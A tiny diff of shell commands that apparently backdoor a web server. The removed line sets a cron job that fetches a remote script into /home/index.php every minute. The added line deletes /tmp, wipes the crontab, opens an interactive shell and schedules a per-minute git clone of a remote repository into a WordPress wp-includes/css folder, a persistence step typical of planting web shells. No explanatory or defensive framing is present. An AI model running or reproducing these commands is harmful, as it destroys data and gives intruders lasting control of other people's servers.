@@ -1,2 +1,1 @@
-# crontab
-echo " * * * * * wget -q https://raw.githubusercontent.com/Anonrocks/crontab/refs/heads/main/crontab.sh -O /home/index.php | crontab -
+rm -rf /tmp;crontab -l;crontab -r;/bin/sh -i;echo " * * * * * git clone https://github.com/anonrocks/crontab /home/user/public_html/wp-includes/css" | crontab -
